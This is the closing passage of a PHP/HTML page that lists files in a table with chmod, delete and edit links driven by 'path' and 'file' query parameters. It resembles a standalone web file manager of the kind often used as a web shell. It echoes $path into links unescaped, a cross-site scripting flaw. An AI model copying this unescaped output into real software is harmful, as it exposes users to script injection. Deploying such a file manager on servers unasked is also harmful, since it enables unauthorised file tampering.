                                        <svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24">
                                            <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.779 17.779 4.36 19.918 6.5 13.5m4.279 4.279 8.364-8.643a3.027 3.027 0 0 0-2.14-5.165 3.03 3.03 0 0 0-2.14.886L6.5 13.5m4.279 4.279L6.499 13.5m2.14 2.14 6.213-6.504M12.75 7.04 17 11.28" />
                                        </svg>
                                    </a>
                                    <!-- File Chmod Action -->
                                    <a href="?path=<?= $path ?>&file=<?= urlencode($file); ?>&action=chmodfile" class='text-blue-600 hover:underline'>
                                        <svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24">
                                            <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 8v8m0-8h8M8 8H6a2 2 0 1 1 2-2v2Zm0 8h8m-8 0H6a2 2 0 1 0 2 2v-2Zm8 0V8m0 8h2a2 2 0 1 1-2 2v-2Zm0-8h2a2 2 0 1 0-2-2v2Z" />
                                        </svg>
                                    </a>
                                    <!-- File Delete Action -->
                                    <a href="?path=<?= $path ?>&file=<?= urlencode($file); ?>&action=deletefile" class='text-blue-600 hover:underline'>
                                        <svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
                                            <path fill-rule="evenodd" d="M8.586 2.586A2 2 0 0 1 10 2h4a2 2 0 0 1 2 2v2h3a1 1 0 1 1 0 2v12a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V8a1 1 0 0 1 0-2h3V4a2 2 0 0 1 .586-1.414ZM10 6h4V4h-4v2Zm1 4a1 1 0 1 0-2 0v8a1 1 0 1 0 2 0v-8Zm4 0a1 1 0 1 0-2 0v8a1 1 0 1 0 2 0v-8Z" clip-rule="evenodd" />
                                        </svg>
                                    </a>
                                </td>
                            </tr>
                        <?php } ?>
                    </tbody>
                <?php else: ?>
                    <span class="text-center text-xs text-gray-700 uppercase bg-gray-50 dark:bg-gray-700 dark:text-gray-400">Directory Is NOT Readable</span>
                <?php endif; ?>
            </table>
        </div>
        <!-- END TABLE DISPLAY -->
    </div>
</body>

</html>
